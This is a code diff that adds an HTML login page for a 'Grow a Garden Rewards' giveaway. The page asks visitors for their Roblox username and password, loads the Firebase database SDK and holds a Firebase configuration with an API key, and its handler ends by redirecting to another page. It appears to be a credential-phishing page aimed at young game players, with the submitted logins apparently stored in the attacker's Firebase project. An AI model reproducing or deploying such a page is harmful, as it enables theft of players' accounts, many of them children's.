@@ -1,4 +1,100 @@
-<script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login - Grow a Garden Rewards</title>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Comic Sans MS', cursive, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(to right, #ff85a2, #8c52ff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .login-box {
+      background-color: #fff;
+      border-radius: 20px;
+      padding: 30px 25px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    }
+
+    .login-box h2 {
+      color: #4b3f72;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 2px solid #ccc;
+      border-radius: 12px;
+      font-size: 1em;
+    }
+
+    .login-box button {
+      width: 100%;
+      background-color: #ff69b4;
+      color: white;
+      padding: 12px;
+      font-size: 1em;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-box button:hover {
+      background-color: #e8559e;
+    }
+
+    .back-link {
+      display: block;
+      margin-top: 15px;
+      text-decoration: none;
+      color: #4b3f72;
+      font-size: 0.95em;
+    }
+
+    .back-link:hover {
+      text-decoration: underline;
+    }
+
+    .fake-note {
+      margin-top: 10px;
+      font-size: 0.8em;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>🔐 Login to Claim Rewards</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Enter your Roblox username" required />
+      <input type="password" id="password" placeholder="Enter your Roblox password!" required />
+      <button type="submit">Login</button>
+    </form>
+    <a class="back-link" href="index.html"><i class="fas fa-arrow-left"></i> Back to Home</a>
+  </div>
+
+  <script>
   const firebaseConfig = {
     apiKey: "AIzaSyA6P52LeV5DO0odSMxxfK7DnSAXZBFH6CM",
     authDomain: "growagardengiveaways-c8ed5.firebaseapp.com",
@@ -50,3 +146,6 @@
     window.location.href = "gag-home.html";
   });
 </script>
+
+</body>
+</html>
